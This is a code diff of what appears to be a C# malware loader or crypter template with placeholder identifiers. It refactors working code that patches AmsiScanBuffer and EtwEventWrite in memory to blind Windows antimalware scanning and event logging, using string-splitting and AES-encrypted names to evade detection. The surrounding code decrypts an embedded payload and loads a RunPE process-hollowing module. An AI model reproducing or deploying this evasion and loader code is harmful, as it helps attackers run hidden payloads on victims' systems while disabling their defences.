@@ -63,28 +63,6 @@ namespace namespace_name
                 return;
             }
 #endif
-
-            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
-            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
-            byte[] patch;
-            uint old;
-
-            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
-            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
-            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
-            Marshal.Copy(patch, 0, asbaddr, patch.Length);
-            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
-
-            IntPtr ntdll = LoadLibrary("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
-            IntPtr etwaddr = GetProcAddress(ntdll, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("etweventwrite_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
-            if (IntPtr.Size == 8) patch = new byte[] { 0xC3 };
-            else patch = new byte[] { 0xC2, 0x14, 0x00 };
-            VirtualProtect(etwaddr, (UIntPtr)patch.Length, 0x40, out old);
-            Marshal.Copy(patch, 0, etwaddr, patch.Length);
-            VirtualProtect(etwaddr, (UIntPtr)patch.Length, old, out old);
-
             string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedllexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
 
@@ -110,6 +88,7 @@ namespace namespace_name
             }
             catch { }
 
+            bypassfunction_name(kmodule);
 #if USE_RUNPE
             Assembly runpe = Assembly.Load(uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(runpestr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
             string runpeclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpeclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
@@ -174,6 +153,30 @@ namespace namespace_name
             byte[] ret = ms.ToArray();
             ms.Dispose();
             return ret;
+        }
+        
+        static void bypassfunction_name(IntPtr kmodule)
+        {
+            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
+            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
+            byte[] patch;
+            uint old;
+
+            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
+            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
+            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
+            Marshal.Copy(patch, 0, asbaddr, patch.Length);
+            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
+
+            IntPtr ntdll = LoadLibrary("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
+            IntPtr etwaddr = GetProcAddress(ntdll, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("etweventwrite_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
+            if (IntPtr.Size == 8) patch = new byte[] { 0xC3 };
+            else patch = new byte[] { 0xC2, 0x14, 0x00 };
+            VirtualProtect(etwaddr, (UIntPtr)patch.Length, 0x40, out old);
+            Marshal.Copy(patch, 0, etwaddr, patch.Length);
+            VirtualProtect(etwaddr, (UIntPtr)patch.Length, old, out old);
         }
 
         [DllImport("kernel32.dll")]
